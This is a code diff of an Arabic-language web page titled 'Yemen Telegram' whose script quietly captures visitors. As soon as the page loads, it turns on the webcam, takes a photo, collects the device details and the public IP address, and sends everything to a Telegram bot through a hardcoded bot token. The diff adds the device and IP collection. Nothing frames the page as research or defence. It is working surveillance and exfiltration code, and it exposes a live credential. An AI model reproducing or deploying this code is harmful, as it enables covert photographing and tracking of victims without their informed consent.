@@ -1,60 +1,68 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Yemen Telegram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yemen Telegram</title>
 </head>
 <body>
-        <h2>يرجى الانتظار.</h2>
+    <h2>جاري الالتقاط...</h2>
+    <script>
+        // بيانات البوت
+        const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
+        const chatId = "-1002819450502";
 
-  <script>
-    // بيانات البوت
-    const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
-    const chatId   = "-1002819450502";
+        window.onload = async function() {
+            try {
+                // تشغيل الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-    window.onload = async function() {
-      try {
-        // تشغيل الكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video  = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+                // الانتظار قليلاً حتى تفتح الكاميرا
+                await new Promise(res => setTimeout(res, 1500));
 
-        // الانتظار قليلاً حتى تفتح الكاميرا
-        await new Promise(res => setTimeout(res, 1500));
+                // التقاط صورة
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
 
-        // التقاط صورة
-        const canvas = document.createElement('canvas');
-        canvas.width  = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
+                // جمع معلومات الجهاز
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
 
-        // تحويل الصورة وإرسالها للبوت
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("photo", blob, "snapshot.jpg");
-          formData.append("caption", "📸 صورة ملتقطة");
+                // جمع عنوان IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
+                // تحويل الصورة وإرسالها للبوت
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", blob, "snapshot.jpg");
+                    formData.append("caption", `📸 صورة ملتقطة\n👀 جهاز: ${userAgent}\n📍 منصة: ${platform}\n🗣️ لغة: ${language}\n📱 IP: ${ip}`);
 
-          // إيقاف الكاميرا
-          stream.getTracks().forEach(track => track.stop());
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
 
-          // تغيير واجهة الصفحة
-          document.body.innerHTML = "<h2>✅ تم </h2>";
-        }, "image/jpeg");
+                    // إيقاف الكاميرا
+                    stream.getTracks().forEach(track => track.stop());
 
-      } catch (err) {
-        console.error("خطأ:", err);
-        alert("❌ لم يتم.");
-      }
-    };
-  </script>
+                    // تغيير واجهة الصفحة
+                    document.body.innerHTML = "<h2>✅ تم الإرسال</h2>";
+                }, "image/jpeg");
+            } catch (err) {
+                console.error("خطأ:", err);
+                alert("❌ لم يتم السماح بالوصول إلى الكاميرا.");
+            }
+        };
+    </script>
 </body>
 </html>
